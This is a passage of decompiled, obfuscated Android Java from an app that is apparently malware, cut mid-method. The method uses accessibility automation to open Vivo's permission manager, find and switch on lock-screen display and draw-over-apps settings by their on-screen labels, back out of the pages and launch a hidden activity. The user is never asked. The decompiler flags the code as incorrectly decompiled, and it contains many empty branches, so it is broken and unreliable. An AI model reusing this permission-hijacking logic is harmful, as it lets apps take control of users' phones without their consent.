      0x027c: PHI (r4v35 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v32 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v36 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:102:0x0266, B:106:0x0276] A[DONT_GENERATE, DONT_INLINE]
      0x027c: PHI (r16v22 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v19 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v23 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:102:0x0266, B:106:0x0276] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:108:0x027e  */
    /* JADX WARN: Removed duplicated region for block: B:111:0x0295  */
    /* JADX WARN: Removed duplicated region for block: B:114:0x02c1  */
    /* JADX WARN: Removed duplicated region for block: B:120:0x02e3 A[PHI: r0 r4 r16
      0x02e3: PHI (r0v73 java.lang.Object) = (r0v72 java.lang.Object), (r0v1 java.lang.Object) binds: [B:118:0x02df, B:22:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x02e3: PHI (r4v42 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v73 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v74 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:118:0x02df, B:22:0x0073] A[DONT_GENERATE, DONT_INLINE]
      0x02e3: PHI (r16v29 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v27 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v30 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:118:0x02df, B:22:0x0073] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:122:0x02eb  */
    /* JADX WARN: Removed duplicated region for block: B:126:0x0303 A[PHI: r0 r4 r16
      0x0303: PHI (r0v79 boolean) = (r0v75 boolean), (r0v85 boolean) binds: [B:121:0x02e9, B:125:0x02fd] A[DONT_GENERATE, DONT_INLINE]
      0x0303: PHI (r4v44 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v71 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v72 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:121:0x02e9, B:125:0x02fd] A[DONT_GENERATE, DONT_INLINE]
      0x0303: PHI (r16v31 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v29 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v32 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:121:0x02e9, B:125:0x02fd] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:127:0x0305  */
    /* JADX WARN: Removed duplicated region for block: B:131:0x031d A[PHI: r0 r4 r16
      0x031d: PHI (r0v86 boolean) = (r0v79 boolean), (r0v92 boolean) binds: [B:126:0x0303, B:130:0x0317] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r4v47 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v44 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v48 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:126:0x0303, B:130:0x0317] A[DONT_GENERATE, DONT_INLINE]
      0x031d: PHI (r16v34 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v31 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v35 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:126:0x0303, B:130:0x0317] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:132:0x031f  */
    /* JADX WARN: Removed duplicated region for block: B:136:0x0337  */
    /* JADX WARN: Removed duplicated region for block: B:137:0x033f  */
    /* JADX WARN: Removed duplicated region for block: B:140:0x0352  */
    /* JADX WARN: Removed duplicated region for block: B:156:0x0395 A[PHI: r8
      0x0395: PHI (r8v16 com.storm.safe.rock.service.modules.yw5xud.a8) = (r8v15 com.storm.safe.rock.service.modules.yw5xud.a8), (r8v17 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:139:0x0350, B:154:0x0388] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:159:0x03a4  */
    /* JADX WARN: Removed duplicated region for block: B:166:0x03d7  */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0142  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x017b  */
    /* JADX WARN: Removed duplicated region for block: B:64:0x0183  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x01bc  */
    /* JADX WARN: Removed duplicated region for block: B:76:0x01cb  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x01f1  */
    /* JADX WARN: Removed duplicated region for block: B:87:0x0218 A[PHI: r4 r16
      0x0218: PHI (r4v25 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v92 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v93 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:85:0x0214, B:29:0x00b4] A[DONT_GENERATE, DONT_INLINE]
      0x0218: PHI (r16v12 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v10 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v13 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:85:0x0214, B:29:0x00b4] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x0229 A[PHI: r0 r4 r16
      0x0229: PHI (r0v38 java.lang.Object) = (r0v37 java.lang.Object), (r0v1 java.lang.Object) binds: [B:88:0x0225, B:28:0x00ab] A[DONT_GENERATE, DONT_INLINE]
      0x0229: PHI (r4v27 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v90 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v91 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:88:0x0225, B:28:0x00ab] A[DONT_GENERATE, DONT_INLINE]
      0x0229: PHI (r16v14 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v12 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v15 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:88:0x0225, B:28:0x00ab] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:92:0x0231  */
    /* JADX WARN: Removed duplicated region for block: B:96:0x0249 A[PHI: r0 r4 r16
      0x0249: PHI (r0v44 boolean) = (r0v40 boolean), (r0v50 boolean) binds: [B:91:0x022f, B:95:0x0243] A[DONT_GENERATE, DONT_INLINE]
      0x0249: PHI (r4v29 com.storm.safe.rock.service.modules.yw5xud.a8) = (r4v88 com.storm.safe.rock.service.modules.yw5xud.a8), (r4v89 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:91:0x022f, B:95:0x0243] A[DONT_GENERATE, DONT_INLINE]
      0x0249: PHI (r16v16 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType) = 
      (r16v14 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
      (r16v17 com.storm.safe.rock.service.modules.yw5xud.VivoSteps$FlowType)
     binds: [B:91:0x022f, B:95:0x0243] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:97:0x024b  */
    /* JADX WARN: Type inference failed for: r2v14 */
    /* JADX WARN: Type inference failed for: r2v15 */
    /* JADX WARN: Type inference failed for: r2v16 */
    /* JADX WARN: Type inference failed for: r2v17 */
    /* JADX WARN: Type inference failed for: r2v2, types: [com.storm.safe.rock.service.modules.yw5xud.VivoSteps$executeBackgroundPopupInternal$1, kotlin.coroutines.jvm.internal.ContinuationImpl, mv] */
    /* JADX WARN: Type inference failed for: r2v9 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:141:0x0365 -> B:143:0x0368). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:63:0x017b -> B:47:0x0140). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:77:0x01e4 -> B:32:0x00d1). Please report as a decompilation issue!!! */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212396b4(ContinuationImpl continuationImpl) throws Throwable {
        C0371a8 vivoSteps$executeBackgroundPopupInternal$1;
        C0371a8 c0371a8;
        int i;
        int i2;
        int i3;
        int i4;
        C0371a8 c0371a82;
        int i5;
        C0371a8 c0371a83;
        VivoSteps$FlowType vivoSteps$FlowType;
        int i6;
        int i7;
        C0371a8 c0371a84;
        C0371a8 c0371a85;
        C0371a8 c0371a86;
        Object objM212430f8;
        String string;
        CharSequence packageName;
        C0371a8 c0371a87;
        C0371a8 c0371a88;
        boolean zBooleanValue;
        C0371a8 c0371a89;
        int i8;
        C0371a8 c0371a810;
        C0371a8 c0371a811;
        C0371a8 c0371a812;
        C0371a8 c0371a813;
        boolean zCanDrawOverlays;
        C0371a8 c0371a814;
        C0371a8 c0371a815;
        boolean zBooleanValue2;
        C0371a8 c0371a816;
        C0371a8 c0371a817;
        C0371a8 c0371a818;
        C0371a8 c0371a819;
        int i9;
        int i10;
        C0371a8 c0371a820;
        VivoSteps$executeBackgroundPopupInternal$1 vivoSteps$executeBackgroundPopupInternal$12;
        C0371a8 c0371a821;
        String string2;
        CharSequence packageName2;
        if (continuationImpl instanceof VivoSteps$executeBackgroundPopupInternal$1) {
            VivoSteps$executeBackgroundPopupInternal$1 vivoSteps$executeBackgroundPopupInternal$13 = (VivoSteps$executeBackgroundPopupInternal$1) continuationImpl;
            int i11 = vivoSteps$executeBackgroundPopupInternal$13.f54830a5;
            if ((i11 & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeBackgroundPopupInternal$13.f54830a5 = i11 - Integer.MIN_VALUE;
                vivoSteps$executeBackgroundPopupInternal$1 = vivoSteps$executeBackgroundPopupInternal$13;
            } else {
                vivoSteps$executeBackgroundPopupInternal$1 = new VivoSteps$executeBackgroundPopupInternal$1(this, continuationImpl);
            }
        }
        Object objM212430f82 = vivoSteps$executeBackgroundPopupInternal$1.f54828a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i12 = vivoSteps$executeBackgroundPopupInternal$1.f54830a5;
        int i13 = 3;
        VivoSteps$FlowType vivoSteps$FlowType2 = VivoSteps$FlowType.BACKGROUND_POPUP;
        VivoSteps$FlowType vivoSteps$FlowType3 = VivoSteps$FlowType.OVERLAY_PERMISSION;
        try {
        } catch (Exception e) {
            tz0.m214810b0("[后台弹窗] ⚠️ 启动iuzxujjtqev失败: ", e.getMessage(), vivoSteps$executeBackgroundPopupInternal$1.f55141a2);
        }
        switch (i12) {
            case 0:
                kg1.m213544f4(objM212430f82);
                w20 w20Var = this.f55142a3;
                boolean z = w20Var.f60755a0.getBoolean("vivo_popup_page_opened", false);
                boolean z2 = w20Var.f60755a0.getBoolean("vivo_popup_switch_done", false);
                boolean zCanDrawOverlays2 = Settings.canDrawOverlays(this.f55140a1);
                if (z && z2 && zCanDrawOverlays2) {
                    w20Var.m214997b2(vivoSteps$FlowType2);
                    w20Var.m214997b2(vivoSteps$FlowType3);
                    return Boolean.TRUE;
                }
                if (!zCanDrawOverlays2 && (z || z2)) {
                    t60.m214726f4(this.f55141a2, "[后台弹窗] ⚠️ 悬浮窗权限未获取，清除子步骤标记，重新执行");
                    w20Var.m214985a0("vivo_popup_page_opened");
                    w20Var.m214985a0("vivo_popup_switch_done");
                }
                c0371a8 = this;
                i = 3;
                i2 = 0;
                if (i2 >= i) {
                    tz0.m214806a6("[后台弹窗] ❌ 达到最大重试次数(", i, ")，失败", c0371a8.f55141a2);
                    return Boolean.FALSE;
                }
                AccessibilityNodeInfo rootInActiveWindow = c0371a8.f55139a0.getRootInActiveWindow();
                if (rootInActiveWindow == null || (packageName = rootInActiveWindow.getPackageName()) == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                if (AbstractC0779a1.m213652a5(string, "permissionmanager", true)) {
                    vivoSteps$FlowType = vivoSteps$FlowType3;
                    c0371a86 = c0371a8;
                    c0371a86.f55142a3.m214998b3("vivo_popup_page_opened");
                    String str = c0371a86.f55145a6;
                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a86;
                    vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i;
                    vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i2;
                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = i13;
                    objM212430f8 = c0371a86.m212430f8(30, str, vivoSteps$executeBackgroundPopupInternal$1, true);
                    if (objM212430f8 != coroutineSingletons) {
                    }
                    return coroutineSingletons;
                }
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a8;
                vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i;
                vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i2;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 1;
                Object objM212420e8 = c0371a8.m212420e8(vivoSteps$executeBackgroundPopupInternal$1);
                if (objM212420e8 != coroutineSingletons) {
                    int i14 = i2;
                    i3 = i;
                    objM212430f82 = objM212420e8;
                    i4 = i14;
                    c0371a82 = c0371a8;
                    if (((Boolean) objM212430f82).booleanValue()) {
                        int i15 = i3;
                        i2 = i4 + 1;
                        i = i15;
                        c0371a8 = c0371a82;
                        if (i2 >= i) {
                        }
                    } else {
                        vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a82;
                        vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i3;
                        vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i4;
                        vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 2;
                        vivoSteps$FlowType = vivoSteps$FlowType3;
                        if (b81.m210571b1(1200L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                            int i16 = i4;
                            c0371a83 = c0371a82;
                            i5 = i16;
                            i = i3;
                            i2 = i5;
                            c0371a86 = c0371a83;
                            c0371a86.f55142a3.m214998b3("vivo_popup_page_opened");
                            String str2 = c0371a86.f55145a6;
                            vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a86;
                            vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i;
                            vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i2;
                            vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = i13;
                            objM212430f8 = c0371a86.m212430f8(30, str2, vivoSteps$executeBackgroundPopupInternal$1, true);
                            if (objM212430f8 != coroutineSingletons) {
                                int i17 = i2;
                                c0371a84 = c0371a86;
                                i6 = i17;
                                i7 = i;
                                objM212430f82 = objM212430f8;
                                if (((Boolean) objM212430f82).booleanValue()) {
                                    t60.m214726f4(c0371a84.f55141a2, "[后台弹窗] ⚠️ 切换失败");
                                    c0371a84.f55139a0.performGlobalAction(1);
                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a84;
                                    vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i7;
                                    vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i6;
                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 4;
                                    break;
                                } else {
                                    c0371a84.f55142a3.m214998b3("vivo_popup_switch_done");
                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a84;
                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 5;
                                    if (b81.m210571b1(500L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                                        c0371a85 = c0371a84;
                                        c0371a85.f55142a3.m214997b2(vivoSteps$FlowType2);
                                        vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a85;
                                        vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 6;
                                        c0371a87 = c0371a85;
                                        if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                                            vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a87;
                                            vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 7;
                                            objM212430f82 = c0371a87.m212430f8(30, "锁屏显示", vivoSteps$executeBackgroundPopupInternal$1, true);
                                            c0371a88 = c0371a87;
                                            if (objM212430f82 != coroutineSingletons) {
                                                zBooleanValue = ((Boolean) objM212430f82).booleanValue();
                                                c0371a89 = c0371a88;
                                                if (zBooleanValue) {
                                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a88;
                                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 8;
                                                    objM212430f82 = c0371a88.m212430f8(10, "在锁屏上显示", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                    c0371a810 = c0371a88;
                                                    break;
                                                } else if (zBooleanValue) {
                                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a89;
                                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 9;
                                                    i8 = 10;
                                                    objM212430f82 = c0371a89.m212430f8(10, "锁屏上方显示", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                    c0371a812 = c0371a89;
                                                    break;
                                                } else {
                                                    i8 = 10;
                                                    c0371a811 = c0371a89;
                                                    if (zBooleanValue) {
                                                        vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a811;
                                                        vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = i8;
                                                        objM212430f82 = c0371a811.m212430f8(i8, "Show on lock screen", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                        c0371a811 = c0371a811;
                                                        break;
                                                    } else {
                                                        if (zBooleanValue) {
                                                            t60.m214726f4(c0371a811.f55141a2, "[后台弹窗] ⚠️ 锁屏显示开关未找到或已开启");
                                                            c0371a813 = c0371a811;
                                                        } else {
                                                            t60.m214704c5(c0371a811.f55141a2, "[后台弹窗] ✅ 锁屏显示开关已开启");
                                                            vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a811;
                                                            vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 11;
                                                            c0371a813 = c0371a811;
                                                            if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                                                            }
                                                        }
                                                        zCanDrawOverlays = Settings.canDrawOverlays(c0371a813.f55140a1);
                                                        t60.m214704c5(c0371a813.f55141a2, "[后台弹窗] 悬浮窗权限检查: canDrawOverlays=" + zCanDrawOverlays + ", SDK=" + Build.VERSION.SDK_INT);
                                                        if (!zCanDrawOverlays) {
                                                            vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a813;
                                                            vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 12;
                                                            c0371a814 = c0371a813;
                                                            if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                                                                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a814;
                                                                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 13;
                                                                objM212430f82 = c0371a814.m212430f8(30, "悬浮窗", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                                c0371a815 = c0371a814;
                                                                if (objM212430f82 != coroutineSingletons) {
                                                                    zBooleanValue2 = ((Boolean) objM212430f82).booleanValue();
                                                                    c0371a816 = c0371a815;
                                                                    if (!zBooleanValue2) {
                                                                        if (!zBooleanValue2) {
                                                                            if (!zBooleanValue2) {
                                                                                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a816;
                                                                                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 16;
                                                                                c0371a820 = c0371a816;
                                                                                break;
                                                                            } else {
                                                                                t60.m214726f4(c0371a816.f55141a2, "[后台弹窗] ⚠️ 悬浮窗开关未找到或已开启");
                                                                                c0371a818 = c0371a816;
                                                                                t60.m214704c5(c0371a818.f55141a2, "[后台弹窗] 🧹 关闭权限管理器页面...");
                                                                                c0371a819 = c0371a818;
                                                                                i9 = 1;
                                                                                i10 = 4;
                                                                                if (i9 < i10) {
                                                                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a819;
                                                                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 18;
                                                                                    if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                                                                                        vivoSteps$executeBackgroundPopupInternal$12 = vivoSteps$executeBackgroundPopupInternal$1;
                                                                                        c0371a821 = c0371a819;
                                                                                        Intent intent = new Intent(c0371a821.f55140a1, (Class<?>) iuzxujjtqev.class);
                                                                                        intent.setFlags(268468224);
                                                                                        c0371a821.f55140a1.startActivity(intent);
                                                                                        vivoSteps$executeBackgroundPopupInternal$12.f54825a0 = c0371a821;
                                                                                        vivoSteps$executeBackgroundPopupInternal$12.f54830a5 = 19;
                                                                                        vivoSteps$executeBackgroundPopupInternal$1 = c0371a821;
                                                                                        break;
                                                                                    }
                                                                                } else {
                                                                                    c0371a819.f55139a0.performGlobalAction(1);
                                                                                    vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a819;
                                                                                    vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i9;
                                                                                    vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 17;
                                                                                    break;
                                                                                }
                                                                            }
                                                                        } else {
                                                                            vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a816;
                                                                            vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 15;
                                                                            objM212430f82 = c0371a816.m212430f8(10, "Overlay", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                                            c0371a816 = c0371a816;
                                                                            break;
                                                                        }
                                                                    } else {
                                                                        vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a815;
                                                                        vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 14;
                                                                        objM212430f82 = c0371a815.m212430f8(10, "Display over", vivoSteps$executeBackgroundPopupInternal$1, true);
                                                                        c0371a817 = c0371a815;
                                                                        break;
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            c0371a813.f55142a3.m214997b2(vivoSteps$FlowType);
                                                            c0371a818 = c0371a813;
                                                            t60.m214704c5(c0371a818.f55141a2, "[后台弹窗] 🧹 关闭权限管理器页面...");
                                                            c0371a819 = c0371a818;
                                                            i9 = 1;
                                                            i10 = 4;
                                                            if (i9 < i10) {
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                int i18 = vivoSteps$executeBackgroundPopupInternal$1.f54827a2;
                i3 = vivoSteps$executeBackgroundPopupInternal$1.f54826a1;
                C0371a8 c0371a822 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                i4 = i18;
                c0371a82 = c0371a822;
                if (((Boolean) objM212430f82).booleanValue()) {
                }
                break;
            case 2:
                i5 = vivoSteps$executeBackgroundPopupInternal$1.f54827a2;
                i3 = vivoSteps$executeBackgroundPopupInternal$1.f54826a1;
                c0371a83 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                i = i3;
                i2 = i5;
                c0371a86 = c0371a83;
                c0371a86.f55142a3.m214998b3("vivo_popup_page_opened");
                String str22 = c0371a86.f55145a6;
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a86;
                vivoSteps$executeBackgroundPopupInternal$1.f54826a1 = i;
                vivoSteps$executeBackgroundPopupInternal$1.f54827a2 = i2;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = i13;
                objM212430f8 = c0371a86.m212430f8(30, str22, vivoSteps$executeBackgroundPopupInternal$1, true);
                if (objM212430f8 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                i6 = vivoSteps$executeBackgroundPopupInternal$1.f54827a2;
                int i19 = vivoSteps$executeBackgroundPopupInternal$1.f54826a1;
                C0371a8 c0371a823 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                i7 = i19;
                c0371a84 = c0371a823;
                vivoSteps$FlowType = vivoSteps$FlowType3;
                if (((Boolean) objM212430f82).booleanValue()) {
                }
                return coroutineSingletons;
            case 4:
                i6 = vivoSteps$executeBackgroundPopupInternal$1.f54827a2;
                i7 = vivoSteps$executeBackgroundPopupInternal$1.f54826a1;
                c0371a84 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                i = i7;
                C0371a8 c0371a824 = c0371a84;
                i2 = i6 + 1;
                c0371a8 = c0371a824;
                vivoSteps$FlowType3 = vivoSteps$FlowType;
                i13 = 3;
                if (i2 >= i) {
                }
                break;
            case 5:
                C0371a8 c0371a825 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a85 = c0371a825;
                c0371a85.f55142a3.m214997b2(vivoSteps$FlowType2);
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a85;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 6;
                c0371a87 = c0371a85;
                if (b81.m210571b1(100L, vivoSteps$executeBackgroundPopupInternal$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                C0371a8 c0371a826 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a87 = c0371a826;
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a87;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 7;
                objM212430f82 = c0371a87.m212430f8(30, "锁屏显示", vivoSteps$executeBackgroundPopupInternal$1, true);
                c0371a88 = c0371a87;
                if (objM212430f82 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 7:
                C0371a8 c0371a827 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a88 = c0371a827;
                zBooleanValue = ((Boolean) objM212430f82).booleanValue();
                c0371a89 = c0371a88;
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 8:
                C0371a8 c0371a828 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a810 = c0371a828;
                zBooleanValue = ((Boolean) objM212430f82).booleanValue();
                c0371a89 = c0371a810;
                if (zBooleanValue) {
                }
                break;
            case 9:
                C0371a8 c0371a829 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                i8 = 10;
                c0371a812 = c0371a829;
                zBooleanValue = ((Boolean) objM212430f82).booleanValue();
                c0371a811 = c0371a812;
                if (zBooleanValue) {
                }
                return coroutineSingletons;
            case 10:
                C0371a8 c0371a830 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a811 = c0371a830;
                zBooleanValue = ((Boolean) objM212430f82).booleanValue();
                if (zBooleanValue) {
                }
                zCanDrawOverlays = Settings.canDrawOverlays(c0371a813.f55140a1);
                t60.m214704c5(c0371a813.f55141a2, "[后台弹窗] 悬浮窗权限检查: canDrawOverlays=" + zCanDrawOverlays + ", SDK=" + Build.VERSION.SDK_INT);
                if (!zCanDrawOverlays) {
                }
                break;
            case oe0.DEFAULT_M /* 11 */:
                C0371a8 c0371a831 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a813 = c0371a831;
                zCanDrawOverlays = Settings.canDrawOverlays(c0371a813.f55140a1);
                t60.m214704c5(c0371a813.f55141a2, "[后台弹窗] 悬浮窗权限检查: canDrawOverlays=" + zCanDrawOverlays + ", SDK=" + Build.VERSION.SDK_INT);
                if (!zCanDrawOverlays) {
                }
                break;
            case FileClientSessionCache.MAX_SIZE /* 12 */:
                C0371a8 c0371a832 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a814 = c0371a832;
                vivoSteps$executeBackgroundPopupInternal$1.f54825a0 = c0371a814;
                vivoSteps$executeBackgroundPopupInternal$1.f54830a5 = 13;
                objM212430f82 = c0371a814.m212430f8(30, "悬浮窗", vivoSteps$executeBackgroundPopupInternal$1, true);
                c0371a815 = c0371a814;
                if (objM212430f82 != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 13:
                C0371a8 c0371a833 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
                kg1.m213544f4(objM212430f82);
                vivoSteps$FlowType = vivoSteps$FlowType3;
                c0371a815 = c0371a833;
                zBooleanValue2 = ((Boolean) objM212430f82).booleanValue();
                c0371a816 = c0371a815;
                if (!zBooleanValue2) {
                }
                return coroutineSingletons;
            case 14:
                C0371a8 c0371a834 = vivoSteps$executeBackgroundPopupInternal$1.f54825a0;
